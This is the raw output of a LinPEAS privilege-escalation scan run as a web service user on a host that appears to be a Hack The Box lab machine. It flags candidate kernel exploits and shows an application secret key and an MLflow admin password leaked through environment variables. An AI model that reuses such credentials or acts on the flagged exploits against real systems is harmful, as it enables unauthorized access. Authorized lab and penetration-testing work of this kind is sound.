[48;2;74;217;38m[38;2;73;217;37m▄[48;2;114;194;86m[38;2;76;215;40m▄[48;2;142;178;121m[38;2;94;205;62m▄[48;2;150;176;129m[38;2;109;196;81m▄[48;2;142;180;120m[38;2;95;203;63m▄[48;2;116;193;88m[38;2;76;214;41m▄[48;2;78;213;44m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;67;196;36m▄[48;2;71;209;37m[38;2;60;154;36m▄[48;2;59;152;36m[38;2;57;138;37m▄[48;2;52;110;38m[38;2;56;130;37m▄[48;2;51;104;38m[38;2;30;71;21m▄[48;2;20;31;17m[38;2;45;69;39m▄[48;2;50;78;44m[38;2;51;78;45m▄[48;2;51;78;45m [0m
         [48;2;51;78;45m[38;2;28;43;24m▄[48;2;51;78;45m[38;2;43;64;38m▄[48;2;51;78;45m[38;2;52;79;46m▄[48;2;34;53;30m[38;2;46;71;41m▄[48;2;64;124;48m[38;2;49;106;36m▄[48;2;53;115;38m[38;2;57;124;40m▄[48;2;63;175;36m[38;2;55;126;38m▄[48;2;73;217;37m[38;2;66;186;36m▄[48;2;89;208;56m[38;2;73;217;37m▄[48;2;111;195;82m[38;2;75;215;40m▄[48;2;109;197;80m[38;2;74;216;38m▄[48;2;85;209;52m[38;2;73;218;36m▄[48;2;73;216;37m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;217;37m[38;2;73;218;37m▄[48;2;73;217;37m[38;2;73;218;37m▄[48;2;73;217;36m[38;2;73;218;37m▄[48;2;73;218;37m[38;2;71;214;36m▄[48;2;71;212;36m[38;2;63;172;36m▄[48;2;63;174;35m[38;2;57;138;37m▄[48;2;58;146;36m[38;2;57;137;38m▄[48;2;58;139;37m[38;2;57;138;37m▄[48;2;58;138;37m[38;2;54;128;35m▄[48;2;50;117;34m[38;2;20;44;14m▄[48;2;20;32;17m[38;2;39;61;34m▄[48;2;51;77;44m[38;2;45;69;40m▄[48;2;51;78;45m[38;2;45;69;40m▄[48;2;51;78;45m[38;2;49;75;43m▄[0m
         [48;2;84;151;67m[38;2;98;177;78m▄[48;2;43;80;34m[38;2;98;177;78m▄[48;2;22;39;19m[38;2;98;178;78m▄[48;2;43;67;38m[38;2;81;148;64m▄[48;2;40;70;33m[38;2;44;78;36m▄[48;2;54;127;36m[38;2;21;47;15m▄[48;2;55;120;39m[38;2;54;117;39m▄[48;2;56;133;37m[38;2;59;133;40m▄[48;2;71;211;36m[38;2;61;164;37m▄[48;2;73;217;36m[38;2;71;211;36m▄[48;2;73;218;37m[38;2;72;218;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;72;217;36m▄[48;2;73;218;37m[38;2;67;203;34m▄[48;2;68;194;37m[38;2;40;116;21m▄[48;2;58;142;36m[38;2;8;21;5m▄[48;2;49;120;31m[38;2;6;10;5m▄[48;2;25;59;16m[38;2;73;108;65m▄[48;2;15;33;11m[38;2;95;157;79m▄[48;2;12;25;9m[38;2;97;175;77m▄[48;2;21;32;19m[38;2;99;179;79m▄[48;2;23;35;19m[38;2;98;178;78m▄[48;2;20;34;17m[38;2;98;178;78m▄[48;2;13;24;11m[38;2;98;178;78m▄[48;2;16;26;14m[38;2;98;177;78m▄[0m
         [48;2;97;176;77m[38;2;58;103;46m▄[48;2;98;177;78m[38;2;94;170;75m▄[48;2;98;177;78m[38;2;99;179;79m▄[48;2;98;177;78m[38;2;97;176;77m▄[48;2;97;176;77m[38;2;98;177;78m▄[48;2;91;165;72m[38;2;98;177;78m▄[48;2;55;100;44m[38;2;98;177;78m▄[48;2;15;27;10m[38;2;92;168;73m▄[48;2;24;46;18m[38;2;76;138;61m▄[48;2;73;154;53m[38;2;54;96;43m▄[48;2;74;213;39m[38;2;24;48;18m▄[48;2;74;222;37m[38;2;20;55;11m▄[48;2;73;217;37m[38;2;31;91;16m▄[48;2;73;218;37m[38;2;49;145;24m▄[48;2;73;218;37m[38;2;68;201;35m▄[48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;74;220;37m▄[48;2;73;218;37m[38;2;73;219;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;73;220;37m▄[48;2;73;218;37m[38;2;72;214;37m▄[48;2;73;218;37m[38;2;63;187;32m▄[48;2;72;217;36m[38;2;41;120;22m▄[48;2;74;222;36m[38;2;21;52;13m▄[48;2;67;203;34m[38;2;39;62;34m▄[48;2;40;117;21m[38;2;64;103;54m▄[48;2;14;43;7m[38;2;72;126;57m▄[48;2;4;12;2m[38;2;87;156;69m▄[48;2;25;45;21m[38;2;97;174;78m▄[48;2;71;124;57m[38;2;99;177;80m▄[48;2;97;168;78m[38;2;94;170;75m▄[48;2;96;175;77m[38;2;103;177;84m▄[48;2;98;176;79m[38;2;109;183;90m▄[48;2;100;178;80m[38;2;112;185;94m▄[48;2;100;177;80m[38;2;111;184;92m▄[48;2;99;177;80m[38;2;107;182;89m▄[48;2;98;177;78m[38;2;105;182;85m▄[48;2;98;177;78m[38;2;103;180;83m▄[48;2;98;177;78m[38;2;99;177;79m▄[0m
          [38;2;54;79;47m▀[38;2;72;123;60m▀[48;2;97;176;78m[38;2;65;87;60m▄[48;2;98;177;78m[38;2;73;130;59m▄[48;2;98;177;78m[38;2;91;165;72m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;96;172;77m[38;2;98;177;78m▄[48;2;82;147;65m[38;2;98;177;78m▄[48;2;66;116;52m[38;2;98;177;78m▄[48;2;46;78;38m[38;2;98;177;78m▄[48;2;27;51;20m[38;2;98;177;78m▄[48;2;28;60;20m[38;2;94;169;74m▄[48;2;28;67;19m[38;2;86;155;69m▄[48;2;34;96;19m[38;2;69;123;54m▄[48;2;42;126;21m[38;2;48;86;39m▄[48;2;51;148;27m[38;2;36;64;28m▄[48;2;55;164;28m[38;2;26;46;20m▄[48;2;60;180;30m[38;2;23;39;18m▄[48;2;62;186;31m[38;2;21;40;17m▄[48;2;61;181;31m[38;2;19;36;16m▄[48;2;67;176;40m[38;2;18;32;14m▄[48;2;63;173;35m[38;2;23;36;19m▄[48;2;56;168;29m[38;2;27;42;23m▄[48;2;53;160;27m[38;2;29;45;24m▄[48;2;44;133;22m[38;2;30;53;25m▄[48;2;34;102;17m[38;2;52;89;43m▄[48;2;20;60;10m[38;2;88;148;71m▄[48;2;24;47;19m[38;2;97;171;78m▄[48;2;34;62;27m[38;2;98;177;78m▄[48;2;55;99;44m[38;2;98;177;78m▄[48;2;80;144;64m[38;2;98;177;78m▄[48;2;99;176;79m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m[38;2;99;177;79m▄[48;2;99;177;79m[38;2;96;172;76m▄[48;2;99;175;79m[38;2;85;151;68m▄[48;2;95;169;76m[38;2;72;121;60m▄[48;2;109;180;92m[38;2;37;57;32m▄[48;2;100;159;85m[38;2;38;41;36m▄[48;2;72;107;62m[38;2;74;74;74m▄[0m[38;2;44;65;38m▀[38;2;31;48;27m▀[38;2;31;48;26m▀[38;2;31;52;25m▀[38;2;41;71;34m▀[38;2;59;97;50m▀[0m
               [38;2;95;106;94m▀[38;2;81;137;65m▀[38;2;91;166;73m▀[48;2;95;174;76m[38;2;61;73;59m▄[48;2;98;177;78m[38;2;33;66;26m▄[48;2;98;177;78m[38;2;81;143;65m▄[48;2;98;177;78m[38;2;102;182;81m▄[48;2;98;177;78m[38;2;97;176;77m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;99;179;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;97;177;77m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;78m▄[48;2;98;177;78m[38;2;99;179;78m▄[48;2;98;177;78m[38;2;93;169;74m▄[48;2;98;177;78m[38;2;56;106;44m▄[48;2;96;174;77m[38;2;16;31;13m▄[48;2;68;126;54m[38;2;58;58;58m▄[0m[38;2;28;50;23m▀[38;2;20;22;20m▀[0m
                     [38;2;41;52;39m▀[38;2;39;76;30m▀[38;2;73;136;57m▀[48;2;90;162;72m[38;2;96;100;95m▄[48;2;99;175;79m[38;2;60;69;58m▄[48;2;98;177;78m[38;2;46;59;43m▄[48;2;98;177;78m[38;2;32;51;27m▄[48;2;98;178;78m[38;2;28;50;23m▄[48;2;98;178;78m[38;2;28;55;22m▄[48;2;98;178;78m[38;2;35;64;28m▄[48;2;98;177;78m[38;2;41;75;33m▄[48;2;98;177;78m[38;2;50;89;41m▄[48;2;98;177;77m[38;2;54;89;45m▄[48;2;98;177;77m[38;2;53;89;44m▄[48;2;98;177;78m[38;2;49;86;39m▄[48;2;98;177;78m[38;2;45;83;36m▄[48;2;98;177;78m[38;2;40;74;32m▄[48;2;98;177;78m[38;2;35;64;28m▄[48;2;98;178;78m[38;2;39;60;33m▄[48;2;90;163;71m[38;2;55;61;53m▄[0m[38;2;53;97;41m▀[38;2;24;44;19m▀[38;2;36;41;35m▀[0m

    [1;32m/---------------------------------------------------------------------------------\
    |                             [1;34mDo you like PEASS?[1;32m                                  |
    |---------------------------------------------------------------------------------|
    |         [1;33mLinux PE & Hardening[1;32m    :     [1;31mhttps://hacktricks-training.com/courses/lhe/[1;32m |
    |         [1;33mLearn Cloud Hacking[1;32m       :     [1;31mhttps://training.hacktricks.xyz [1;32m        |
    |         [1;33mFollow on Twitter[1;32m         :     [1;31m@hacktricks_live[1;32m                        |
    |         [1;33mRespect on HTB[1;32m            :     [1;31mSirBroccoli            [1;32m                 |
    |---------------------------------------------------------------------------------|
    |                                 [1;34mThank you! [1;32m                                     |
    \---------------------------------------------------------------------------------/
[1;34m          LinPEAS-ng [1;33mby carlospolop
[0m
[1;33mADVISORY: [1;34mThis script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.
[0m
[1;34mLinux Privesc Checklist: [1;33mhttps://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
[0m[1;34mBest Linux PE & Hardening course: [1;33mhttps://hacktricks-training.com/courses/lhe/
[0m [1;4mLEGEND[0m:
  [1;31;103mRED/YELLOW[0m: 95% a PE vector
  [1;31mRED[0m: You should take a look into it
  [1;96mLightCyan[0m: Users with console
  [1;34mBlue[0m: Users without console & mounted devs
  [1;32mGreen[0m: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  [1;95mLightMagenta[0m: Your username

 [1;90mStarting LinPEAS. Caching Writable Folders...[0m
[1;34m                               ╔═══════════════════╗
═══════════════════════════════╣ [1;32mBasic information[1;34m ╠═══════════════════════════════
[1;34m                               ╚═══════════════════╝[0m
[1;37mOS: [0mLinux version 5.15.0-177-generic (buildd@lcy02-amd64-099) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04.3) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #187-Ubuntu SMP Sat Apr 11 22:54:33 UTC 2026
[1;37mUser & Groups: [0muid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
[1;37mHostname: [0msmarthire

[1;33m[+] [1;32m/usr/bin/ping[1;34m is available for network discovery[1;37m (LinPEAS can discover hosts, learn more with -h)
[0m[1;33m[+] [1;32m/usr/bin/bash[1;34m is available for network discovery, port scanning and port forwarding[1;37m (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)
[1;33m[+] [1;32m/usr/bin/nc[1;34m is available for network discovery & port scanning[1;37m (LinPEAS can discover hosts and scan ports, learn more with -h)
[0m

[1;32mCaching directories [0m[1;33mDONE
[0m
[1;34m                              ╔════════════════════╗
══════════════════════════════╣ [1;32mSystem Information[1;34m ╠══════════════════════════════
[1;34m                              ╚════════════════════╝[0m
[1;34m╔══════════╣ [1;32mOperative system [1;90m(T1082)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
[0mLinux version 5.15.0-177-generic (buildd@lcy02-amd64-099) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04.3) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #187-Ubuntu SMP Sat Apr 11 22:54:33 UTC 2026
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.5 LTS
Release:	22.04
Codename:	jammy

[1;34m╔══════════╣ [1;32mSudo version [1;90m(T1548.003,T1068)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
[0mSudo version [1;31m1.9.9[0m


[1;34m╔══════════╣ [1;32mPATH [1;90m(T1574.007)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
[0m/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[1;34m╔══════════╣ [1;32mDate & uptime [1;90m(T1082)
[0mThu Jul  2 03:30:38 AM UTC 2026
 03:30:38 up 54 min,  0 users,  load average: 1.02, 0.34, 0.24

[1;34m╔══════════╣ [1;32mUnmounted file-system? [1;90m(T1082,T1120)
[0m[1;34m╚ [1;34m[3mCheck if you can mount umounted devices
[0m[1;34m/dev/ubuntu-vg/ubuntu-lv[0m  [1;34m/[0m       ext4  errors=remount-ro  0 1
[1;34m/dev[0m[1;34m/[0msda2  [1;34m/boot[0m   ext4  defaults           0 2
[1;34m/dev[0m[1;34m/[0msda3  none    [1;32mswap[0m  sw                 0 0

[1;34m╔══════════╣ [1;32mAny sd*/disk* disk in /dev? (limit 20) [1;90m(T1082)
[0mdisk
sda
sda1
sda2
sda3
sda4

[1;34m╔══════════╣ [1;32mEnvironment [1;90m(T1082,T1552.007)
[0m[1;34m╚ [1;34m[3mAny private information inside environment variables?
[0mLESSOPEN=| /usr/bin/lesspipe %s
USER=svcweb
SHLVL=0
SMARTHIRE_[1;31mSECRET[0m_KEY=b9c53f2f4459ee6ed15f7f85c0549861
HOME=/home/svcweb
OLDPWD=/var/www/smarthire.htb
MLFLOW_TRACKING_USERNAME=admin
LOGNAME=svcweb
_=./linpeas.sh
SERVER_SOFTWARE=gunicorn/22.0.0
LANG=en_US.UTF-8
SHELL=/bin/bash
MLFLOW_TRACKING_[1;31mPASSW[0mORD=[1;31mpassw[0mord
LESSCLOSE=/usr/bin/lesspipe %s %s
MLFLOW_TRACKING_URI=http://127.0.0.1:5000
PWD=/tmp

[1;34m╔══════════╣ [1;32mSearching Signature verification failed in dmesg [1;90m(T1082)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed
[0m[1;90mdmesg Not Found
[0m
[1;34m╔══════════╣ [1;32mProtections [1;90m(T1518.001)
[0m[1;34m═╣ [1;32mAppArmor enabled? .............. [0m[0mYou do not have enough privilege to read the profile set.
apparmor module is loaded.
[1;34m═╣ [1;32mAppArmor profile? .............. [0m[0m[1;31munconfined[0m
[1;34m═╣ [1;32mis linuxONE? ................... [0m[0m[1;90ms390x Not Found
[0m[1;34m═╣ [1;32mgrsecurity present? ............ [0m[0m[1;90mgrsecurity Not Found
[0m[1;34m═╣ [1;32mPaX bins present? .............. [0m[0m[1;90mPaX Not Found
[0m[1;34m═╣ [1;32mExecshield enabled? ............ [0m[0m[1;90mExecshield Not Found
[0m[1;34m═╣ [1;32mSELinux enabled? ............... [0m[0m[1;90msestatus Not Found
[0m[1;34m═╣ [1;32mSeccomp enabled? ............... [0m[0m[1;31mdisabled[0m
[1;34m═╣ [1;32mUser namespace? ................ [0m[0m[1;32menabled[0m
[1;34m═╣ [1;32munpriv_userns_clone? ........... [0m[1;32m0[0m
[1;34m═╣ [1;32munpriv_bpf_disabled? ........... [0m[1;32m2[0m
[1;34m═╣ [1;32mCgroup2 enabled? ............... [0m[0m[1;32menabled[0m
[1;34m═╣ [1;32mkptr_restrict? ................. [0m[1;32m1[0m
[1;34m═╣ [1;32mdmesg_restrict? ................ [0m[1;32m1[0m
[1;34m═╣ [1;32mptrace_scope? .................. [0m[1;32m1[0m
[1;34m═╣ [1;32mprotected_symlinks? ............ [0m[1;90m/proc/sys/fs/protected_symlinks Not Found
[0m[1;34m═╣ [1;32mprotected_hardlinks? ........... [0m[1;90m/proc/sys/fs/protected_hardlinks Not Found
[0m[1;34m═╣ [1;32mperf_event_paranoid? ........... [0m[0m[1;32m4[0m
[1;34m═╣ [1;32mmmap_min_addr? ................. [0m[1;32m65536[0m
[1;34m═╣ [1;32mlockdown mode? ................. [0m[0m[[1;31mnone[0m] [1;32mintegrity[0m [1;32mconfidentiality[0m
[1;34m═╣ [1;32mKernel hardening flags? ........ [0m[0mCONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_RANDOMIZE_BASE=y
CONFIG_STACKPROTECTOR=y
CONFIG_STACKPROTECTOR_STRONG=y
# CONFIG_KASAN is not set
[1;34m═╣ [1;32mIs ASLR enabled? ............... [0m[0m[1;32mYes[0m
[1;34m═╣ [1;32mPrinter? ....................... [0m[0m[1;90mNo
[0m[1;34m═╣ [1;32mIs this a virtual machine? ..... [0m[0m[1;31mYes (vmware)[0m

[1;34m╔══════════╣ [1;32mKernel Modules Information [1;90m(T1547.006)
[0m[1;34m══╣ [1;32mKernel modules with weak perms? [1;90m(T1547.006)
[0m
[1;34m══╣ [1;32mKernel modules loadable?  [1;90m(T1547.006)
[0m[1;31mModules can be loaded[0m
[1;34m══╣ [1;32mModule signature enforcement?  [1;90m(T1547.006)
[0m[1;31mNot enforced[0m

[1;34m╔══════════╣ [1;32mChecking for Copy Fail (CVE-2026-31431) [1;90m(T1068)
[0m[1;34m╚ [1;34m[3mhttps://copy.fail/
[0m[1;34m╚ [1;34m[3mhttps://www.cve.org/CVERecord?id=CVE-2026-31431
[0m[1;32mNOT VULNERABLE: AF_ALG/authencesn is not reachable from this context (No such file or directory)[0m

[1;34m╔══════════╣ [1;32mKernel Exploit Registry [1;90m(T1068)
[0m[1;34m═╣ [1;32mOperating system ............. Linux
[0m[1;34m═╣ [1;32mKernel release ............... 5.15.0-177-generic
[0m[1;34m═╣ [1;32mComparable version ........... 5.15.0.177
[0m[1;34m═╣ [1;32mData chunk limit ............. max 25 rows per KERNEL_CVE_DATA_* variable (1..21)
[0m[1;34m═╣ [1;32mKernel config source ......... /boot/config-5.15.0-177-generic
[0m[1;31;103mCVE: CVE-2022-0847 | Name: DirtyPipe | Match data: pkg=linux-kernel,ver>=5.8,ver<=5.16.11 | Tags: ubuntu=(20.04|21.04),debian=11 | Rank: 1[0m
[1;31;103mCVE: CVE-2022-0995 | Name: watch_queue | Match data: pkg=linux-kernel,ver>=5.8,ver<5.16.5,x86_64 | Tags: ubuntu=21.10{kernel:5.13.0.37-generic} | Rank: 1 | Details: Not 100% reliable, may need to be run a couple of times. It rare cases it may panic the kernel.[0m
[1;31;103m[1;34m═╣ [1;32mKernel vulns found: 2[0m
[1;31;103m[0m[0m
[1;34m╔══════════╣ [1;32mChecking for Dirty Frag (CVE-2026-43284 / CVE-2026-43500) [1;90m(T1068)
[0m[1;34m╚ [1;34m[3mhttps://ubuntu.com/blog/dirty-frag-linux-vulnerability-fixes-available
[0m[1;34m╚ [1;34m[3mhttps://www.cve.org/CVERecord?id=CVE-2026-43284
[0m[1;34m╚ [1;34m[3mhttps://www.cve.org/CVERecord?id=CVE-2026-43500
[0m[1;31;103mCVE-2026-43284 (xfrm-ESP): loaded: xfrm_user[0m
[1;31;103mCVE-2026-43500 (rxrpc): autoloadable: rxrpc[0m
[1;32mmodprobe mitigation (xfrm-ESP): present[0m
[1;32mmodprobe mitigation (rxrpc): present[0m
[1;32mUnprivileged user namespaces: disabled (breaks the public PoC)[0m
[1;33mKernel build predates upstream fix (2026-05-08): likely unpatched unless distro backport.[0m



[1;34m                                   ╔═══════════╗
═══════════════════════════════════╣ [1;32mContainer[1;34m ╠═══════════════════════════════════
[1;34m                                   ╚═══════════╝[0m
[1;34m╔══════════╣ [1;32mContainer related tools present (if any): [1;90m(T1613)
[0m/usr/bin/docker
/usr/sbin/runc
/usr/bin/ctr
/usr/bin/containerd
/usr/bin/docker-proxy
/usr/sbin/apparmor_parser
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot
/usr/sbin/capsh
/usr/sbin/setcap
/usr/sbin/getcap

[1;34m╔══════════╣ [1;32mContainer details [1;90m(T1613,T1611)
[0m[1;34m═╣ [1;32mIs this a container? ...........[0m [1;90mNo
[0m[0m[1;34m═╣ [1;32mDocker version ...............[0m [0mClient:
 Version:           29.1.3
 API version:       1.52
 Go version:        go1.24.4
 Git commit:        29.1.3-0ubuntu3~22.04.2
 Built:             Wed Apr 29 22:18:59 2026
 OS/Arch:           linux/amd64
 Context:           default
[1;90mdocker Not Found
[0m[1;34m═╣ [1;32mDocker info .................[0m [0mClient:
 Version:    29.1.3
 Context:    default
 Debug Mode: false
 Plugins:
  trust: Manage trust on Docker images (Docker Inc.)
    Version:  29.1.3
    Path:     /usr/libexec/docker/cli-plugins/docker-trust

Server:
[1;90mdocker Not Found
[0m[1;34m═╣ [1;32mrunc version ...............[0m [0mrunc version 1.3.4-0ubuntu1~22.04.1
spec: 1.2.1
go: go1.24.4
libseccomp: 2.5.3
[1;34m═╣ [1;32mctr version ................[0m [0mClient:
  Version:  2.2.1
  Revision: 
  Go version: go1.24.4

[1;90mctr Not Found
[0m[1;34m═╣ [1;32mInteresting runtime sockets ... [0m[0mYou don't have write permissions over interesting socket [1;32m/run/docker.sock[0m
[1;34m═╣ [1;32mAny running containers? ........ [0m[0m[1;90mNo
[0m


[1;34m                                     ╔═══════╗
═════════════════════════════════════╣ [1;32mCloud[1;34m ╠═════════════════════════════════════
[1;34m                                     ╚═══════╝[0m
[1;33mLearn and practice cloud hacking techniques in [1;34mhttps://training.hacktricks.xyz
[0m
[1;34m═╣ [1;32mGCP Virtual Machine? ................. [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mGCP Cloud Funtion? ................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS ECS? ............................. [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS EC2? ............................. [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS EC2 Beanstalk? ................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS Lambda? .......................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS Codebuild? ....................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mDO Droplet? .......................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mIBM Cloud VM? ........................ [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAzure VM or Az metadata? ............. [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAzure APP or IDENTITY_ENDPOINT? ...... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAzure Automation Account? ............ [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAliyun ECS? .......................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mTencent CVM? ......................... [1;32mNo[0m
[0m[0m


[1;34m                ╔════════════════════════════════════════════════╗
════════════════╣ [1;32mProcesses, Crons, Timers, Services and Sockets[1;34m ╠════════════════
[1;34m                ╚════════════════════════════════════════════════╝[0m
[1;34m╔══════════╣ [1;32mRunning processes (cleaned) [1;90m(T1057)
[0m[1;34m╚ [1;34m[3mCheck weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
[0m[1;31mroot[0m           1  0.0  0.2 100716 11512 ?        Ss   02:35   0:01 /sbin[1;32m/init[0m
[1;31mroot[0m         507  1.8  1.8 146772 75200 ?        S<s  02:35   1:00 /lib/[1;34msys[0mtemd/systemd-journald
[1;31mroot[0m         533  0.0  0.6 289464 27244 ?        SLsl 02:35   0:00 /sbin/multipathd -d -s
[1;31mroot[0m         535  0.0  0.1  25984  6704 ?        Ss   02:35   0:00 /lib/[1;34msys[0mtemd/systemd-[1;32mudev[0md
[1;34msys[0mtemd+     675  0.0  0.3  26476 14208 ?        Ss   02:35   0:00 /lib/systemd/systemd-resolved
  └─([1;90mCaps[0m) 0x0000000000002000=[1;31mcap_net_raw[0m
[1;34msys[0mtemd+     676  0.0  0.1  89364  6656 ?        Ssl  02:35   0:00 /lib/systemd/systemd-timesyncd
  └─([1;90mCaps[0m) 0x0000000002000000=cap_sys_time
[1;31mroot[0m         681  1.9  0.0  85728  3020 ?        S<sl 02:35   1:03 /sbin/auditd
[1;34m_laurel[0m      684  1.1  0.2  15792 11768 ?        S<   02:35   0:37  _ /usr/local/sbin/laurel --config /etc/laurel/config.toml
  └─([1;90mCaps[0m) 0x0000000000080004=[1;31mcap_dac_read_search[0m,[1;31mcap_sys_ptrace[0m
[1;31mroot[0m         692  0.0  0.2  51160 11656 ?        Ss   02:35   0:00 /usr/bin[1;32m/VGAuthService[0m
[1;31mroot[0m         697  0.2  0.2 316116 10064 ?        Ssl  02:35   0:06 /usr/bin[1;32m/vmtoolsd[0m
[1;31mroot[0m         713  0.0  0.1 101244  5940 ?        Ssl  02:35   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
[1;32mmessage+[0m     762  0.0  0.1   8632  4884 ?        Ss   02:35   0:00 @dbus-[1;34mdaemon[0m --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─([1;90mCaps[0m) 0x0000000020000000=cap_audit_write
[1;31mroot[0m         766  0.0  0.1  82836  4016 ?        Ssl  02:35   0:00 /usr/sbin/irqbalance --foreground
[1;31mroot[0m         767  0.0  0.4  32732 19768 ?        Ss   02:35   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
[1;31mroot[0m         769  0.0  0.1 234512  6676 ?        Ssl  02:35   0:00 /usr/libexec/polkitd --no-debug
[1;34m[1;32msyslog[0m[0m       770  0.0  0.1 222404  5932 ?        Ssl  02:35   0:00 /usr/sbin/rsyslogd -n -iNONE
[1;31mroot[0m         771  0.0  0.1  14912  6552 ?        Ss   02:35   0:00 /lib/[1;34msys[0mtemd/systemd-logind
[1;31mroot[0m         772  0.0  0.3 392604 12844 ?        Ssl  02:35   0:00 /usr/libexec/udisks2/udisksd
[1;31mroot[0m         786  0.0  0.3 317976 12296 ?        Ssl  02:35   0:00 /usr/sbin/ModemManager
[1;31mroot[0m        1028  0.0  0.0   6896  3032 ?        Ss   02:35   0:00 /usr/sbin/[1;32mcron[0m -f -P
[1;96m[1;95msvcweb[0m[0m      1029  0.0  0.5  30808 22020 ?        Ss   02:35   0:00 [1;31m/var/[1;32mwww[0m/smarthire.htb/.venv/bin[0m/python3 [1;31m/var/www/smarthire.htb/.venv/bin[0m/gunicorn --workers 4 wsgi:app
[1;96m[1;95msvcweb[0m[0m      1123  2.5  5.0 615088 203764 ?       Sl   02:35   1:23  _ [1;31m/var/[1;32mwww[0m/smarthire.htb/.venv/bin[0m/python3 [1;31m/var/www/smarthire.htb/.venv/bin[0m/gunicorn --workers 4 wsgi:app
[1;96m[1;95msvcweb[0m[0m      1125  2.5  5.0 614960 203644 ?       Sl   02:35   1:23  _ [1;31m/var/[1;32mwww[0m/smarthire.htb/.venv/bin[0m/python3 [1;31m/var/www/smarthire.htb/.venv/bin[0m/gunicorn --workers 4 wsgi:app
[1;96m[1;95msvcweb[0m[0m      1695  0.2  3.5 477688 140228 ?       Sl   03:19   0:01  _ [1;31m/var/[1;32mwww[0m/smarthire.htb/.venv/bin[0m/python3 [1;31m/var/www/smarthire.htb/.venv/bin[0m/gunicorn --workers 4 wsgi:app
